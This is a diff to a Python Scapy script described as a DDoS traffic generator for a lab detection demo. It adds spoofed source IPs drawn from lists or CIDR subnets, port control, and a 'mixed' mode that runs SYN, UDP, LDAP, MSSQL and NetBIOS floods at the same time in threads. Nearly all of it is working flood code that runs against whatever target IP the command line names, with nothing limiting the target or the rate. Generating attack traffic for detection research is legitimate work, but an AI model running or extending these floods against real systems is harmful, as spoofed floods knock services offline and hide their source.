@@ -33,10 +33,12 @@ Requirements:
 from __future__ import annotations
 
 import argparse
+import ipaddress
 import logging
 import os
 import random
 import sys
+import threading
 import time
 
 logging.basicConfig(
@@ -67,8 +69,77 @@ ATTACK_DESCRIPTIONS = {
     "udp_lag": "UDP-Lag Flood — large UDP payloads causing processing delay",
     "ldap_flood": "LDAP amplification-style — UDP port 389 with LDAP-like payloads",
     "mssql_flood": "MSSQL amplification-style — UDP port 1434 with MSSQL-like payloads",
+    "mixed": "Mixed concurrent DDoS traffic from multiple spoofed attacker IPs",
     "netbios_flood": "NetBIOS amplification-style — UDP port 137 with NetBIOS-like payloads",
 }
+
+RANDOMIZE_PORTS = False
+SYN_SPOOF_SOURCE = None
+SPOOF_SOURCES: list[str] = []
+DEFAULT_DEMO_SPOOF_SOURCES = [
+    "10.10.1.10",
+    "10.10.1.11",
+    "10.10.1.12",
+    "10.10.1.13",
+    "10.10.1.14",
+]
+SOURCE_PORTS = {
+    "benign_tcp": 31080,
+    "benign_udp": 31053,
+    "syn_flood": 32080,
+    "udp_flood": 33000,
+    "udp_lag": 33001,
+    "ldap_flood": 33389,
+    "mssql_flood": 33434,
+    "netbios_flood": 33137,
+}
+
+
+def _sport(name: str):
+    return RandShort() if RANDOMIZE_PORTS else SOURCE_PORTS[name]
+
+
+def _dport(default_port: int):
+    return random.randint(1024, 65535) if RANDOMIZE_PORTS else default_port
+
+
+def _source_ip(traffic_name: str) -> str | None:
+    """Return a spoofed source IP for lab simulation, if configured."""
+    if traffic_name == "syn_flood" and SYN_SPOOF_SOURCE:
+        return SYN_SPOOF_SOURCE
+    if SPOOF_SOURCES:
+        return random.choice(SPOOF_SOURCES)
+    return None
+
+
+def _ip_layer(target: str, traffic_name: str):
+    ip_layer = IP(dst=target)
+    spoofed_source = _source_ip(traffic_name)
+    if spoofed_source:
+        ip_layer.src = spoofed_source
+    return ip_layer
+
+
+def _parse_spoof_sources(values: str | None, subnet: str | None, count: int) -> list[str]:
+    """Build a deterministic list of spoofed source IPs for isolated lab tests."""
+    sources: list[str] = []
+    if values:
+        sources.extend([item.strip() for item in values.split(",") if item.strip()])
+    if subnet:
+        network = ipaddress.ip_network(subnet, strict=False)
+        hosts = [str(host) for host in network.hosts()]
+        if not hosts:
+            raise ValueError(f"Subnet has no usable hosts: {subnet}")
+        sources.extend(hosts[: max(1, count)])
+    # De-duplicate while preserving order.
+    seen = set()
+    unique_sources = []
+    for source in sources:
+        if source not in seen:
+            ipaddress.ip_address(source)
+            unique_sources.append(source)
+            seen.add(source)
+    return unique_sources
 
 
 def _check_root() -> None:
@@ -86,8 +157,8 @@ def generate_benign(target: str, duration: float, pps: int) -> None:
 
     while time.time() < end_time:
         # HTTP GET (TCP port 80)
-        pkt = IP(dst=target) / TCP(
-            sport=RandShort(),
+        pkt = _ip_layer(target, "benign_tcp") / TCP(
+            sport=_sport("benign_tcp"),
             dport=80,
             flags="S",
         )
@@ -95,13 +166,13 @@ def generate_benign(target: str, duration: float, pps: int) -> None:
         count += 1
 
         # ICMP ping
-        pkt = IP(dst=target) / ICMP()
+        pkt = _ip_layer(target, "benign_icmp") / ICMP()
         send(pkt, verbose=False)
         count += 1
 
         # DNS query (UDP port 53, small payload)
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
+        pkt = _ip_layer(target, "benign_udp") / UDP(
+            sport=_sport("benign_udp"),
             dport=53,
         ) / Raw(load=b"\x00" * 32)
         send(pkt, verbose=False)
@@ -114,14 +185,20 @@ def generate_benign(target: str, duration: float, pps: int) -> None:
 
 def generate_syn_flood(target: str, duration: float, pps: int) -> None:
     """TCP SYN Flood — send SYN packets with random source ports."""
-    logger.info(f"SYN Flood to {target}:{80} for {duration}s at ~{pps} pps")
+    if SYN_SPOOF_SOURCE or SPOOF_SOURCES:
+        logger.info(
+            f"SYN Flood to {target}:80 for {duration}s at ~{pps} pps "
+            f"(spoofed sources: {SYN_SPOOF_SOURCE or len(SPOOF_SOURCES)})"
+        )
+    else:
+        logger.info(f"SYN Flood to {target}:80 for {duration}s at ~{pps} pps")
     end_time = time.time() + duration
     count = 0
     delay = 1.0 / max(pps, 1)
 
     while time.time() < end_time:
-        pkt = IP(dst=target) / TCP(
-            sport=RandShort(),
+        pkt = _ip_layer(target, "syn_flood") / TCP(
+            sport=_sport("syn_flood"),
             dport=80,
             flags="S",
             seq=random.randint(0, 2**32 - 1),
@@ -142,9 +219,9 @@ def generate_udp_flood(target: str, duration: float, pps: int) -> None:
     payload = os.urandom(64)
 
     while time.time() < end_time:
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
-            dport=random.randint(1, 65535),
+        pkt = _ip_layer(target, "udp_flood") / UDP(
+            sport=_sport("udp_flood"),
+            dport=_dport(4444),
         ) / Raw(load=payload)
         send(pkt, verbose=False)
         count += 1
@@ -162,9 +239,9 @@ def generate_udp_lag(target: str, duration: float, pps: int) -> None:
     payload = os.urandom(1400)
 
     while time.time() < end_time:
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
-            dport=random.randint(1, 65535),
+        pkt = _ip_layer(target, "udp_lag") / UDP(
+            sport=_sport("udp_lag"),
+            dport=_dport(4445),
         ) / Raw(load=payload)
         send(pkt, verbose=False)
         count += 1
@@ -195,8 +272,8 @@ def generate_ldap_flood(target: str, duration: float, pps: int) -> None:
     )
 
     while time.time() < end_time:
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
+        pkt = _ip_layer(target, "ldap_flood") / UDP(
+            sport=_sport("ldap_flood"),
             dport=389,
         ) / Raw(load=ldap_payload)
         send(pkt, verbose=False)
@@ -216,8 +293,8 @@ def generate_mssql_flood(target: str, duration: float, pps: int) -> None:
     mssql_payload = b"\x02" + os.urandom(100)
 
     while time.time() < end_time:
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
+        pkt = _ip_layer(target, "mssql_flood") / UDP(
+            sport=_sport("mssql_flood"),
             dport=1434,
         ) / Raw(load=mssql_payload)
         send(pkt, verbose=False)
@@ -245,8 +322,8 @@ def generate_netbios_flood(target: str, duration: float, pps: int) -> None:
     )
 
     while time.time() < end_time:
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
+        pkt = _ip_layer(target, "netbios_flood") / UDP(
+            sport=_sport("netbios_flood"),
             dport=137,
         ) / Raw(load=netbios_payload)
         send(pkt, verbose=False)
@@ -265,6 +342,15 @@ ATTACK_GENERATORS = {
     "mssql_flood": generate_mssql_flood,
     "netbios_flood": generate_netbios_flood,
 }
+
+MIXED_ATTACKS = [
+    "syn_flood",
+    "udp_flood",
+    "udp_lag",
+    "ldap_flood",
+    "mssql_flood",
+    "netbios_flood",
+]
 
 
 def run_all_attacks(target: str, duration: float, pps: int) -> None:
@@ -290,7 +376,37 @@ def run_all_attacks(target: str, duration: float, pps: int) -> None:
     logger.info("All attack phases completed.")
 
 
+def run_mixed_attacks(target: str, duration: float, pps: int) -> None:
+    """Run multiple attack types concurrently for a DDoS-style log demo."""
+    per_attack_pps = max(1, int(pps / len(MIXED_ATTACKS)))
+    logger.info(
+        "Running mixed concurrent attacks: %s | duration=%ss | total_pps~%s | per_attack_pps~%s",
+        ", ".join(MIXED_ATTACKS),
+        duration,
+        pps,
+        per_attack_pps,
+    )
+
+    threads = []
+    for attack in MIXED_ATTACKS:
+        thread = threading.Thread(
+            target=ATTACK_GENERATORS[attack],
+            args=(target, duration, per_attack_pps),
+            name=f"mixed-{attack}",
+            daemon=True,
+        )
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+    logger.info("Mixed attack phase completed.")
+
+
 def main() -> None:
+    global RANDOMIZE_PORTS, SYN_SPOOF_SOURCE, SPOOF_SOURCES
+
     parser = argparse.ArgumentParser(
         description="DDoS traffic generator for 2-VM detection demo (LAB USE ONLY)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
@@ -307,12 +423,22 @@ def main() -> None:
     parser.add_argument("--target", "-t", type=str,
                         help="Victim VM IP address")
     parser.add_argument("--attack", "-a", type=str,
-                        choices=list(ATTACK_GENERATORS.keys()) + ["all"],
+                        choices=list(ATTACK_GENERATORS.keys()) + ["all", "mixed"],
                         help="Attack type to generate")
     parser.add_argument("--duration", "-d", type=float, default=30,
                         help="Duration in seconds (default: 30)")
     parser.add_argument("--pps", type=int, default=100,
                         help="Approximate packets per second (default: 100)")
+    parser.add_argument("--randomize-ports", action="store_true",
+                        help="Randomize source ports. Useful for stress tests, but not recommended for ML flow demo.")
+    parser.add_argument("--syn-spoof-source", type=str, default=None,
+                        help="Optional spoofed source IP for syn_flood lab demo.")
+    parser.add_argument("--spoof-sources", type=str, default=None,
+                        help="Comma-separated spoofed source IPs for all traffic types, e.g. 10.10.1.10,10.10.1.11")
+    parser.add_argument("--spoof-subnet", type=str, default=None,
+                        help="Generate spoofed source IPs from a CIDR range, e.g. 10.10.1.0/28")
+    parser.add_argument("--spoof-count", type=int, default=10,
+                        help="Number of spoofed IPs to use from --spoof-subnet (default: 10)")
     parser.add_argument("--list", action="store_true",
                         help="List available attack types and exit")
 
@@ -331,16 +457,30 @@ def main() -> None:
         parser.error("--attack is required (attack type)")
 
     _check_root()
+    RANDOMIZE_PORTS = bool(args.randomize_ports)
+    SYN_SPOOF_SOURCE = args.syn_spoof_source
+    SPOOF_SOURCES = _parse_spoof_sources(args.spoof_sources, args.spoof_subnet, args.spoof_count)
+    if args.attack == "mixed" and not SPOOF_SOURCES and not SYN_SPOOF_SOURCE:
+        SPOOF_SOURCES = DEFAULT_DEMO_SPOOF_SOURCES.copy()
 
     logger.warning("=" * 60)
     logger.warning("  DDoS TRAFFIC GENERATOR — LAB USE ONLY")
     logger.warning(f"  Target: {args.target}")
     logger.warning(f"  Attack: {args.attack}")
     logger.warning(f"  Duration: {args.duration}s, PPS: {args.pps}")
+    logger.warning(f"  Randomize ports: {RANDOMIZE_PORTS}")
+    if SYN_SPOOF_SOURCE:
+        logger.warning(f"  SYN spoof source: {SYN_SPOOF_SOURCE}")
+    if SPOOF_SOURCES:
+        preview = ", ".join(SPOOF_SOURCES[:5])
+        suffix = "..." if len(SPOOF_SOURCES) > 5 else ""
+        logger.warning(f"  Spoofed attacker IPs: {len(SPOOF_SOURCES)} ({preview}{suffix})")
     logger.warning("=" * 60)
 
     if args.attack == "all":
         run_all_attacks(args.target, args.duration, args.pps)
+    elif args.attack == "mixed":
+        run_mixed_attacks(args.target, args.duration, args.pps)
     else:
         ATTACK_GENERATORS[args.attack](args.target, args.duration, args.pps)
 
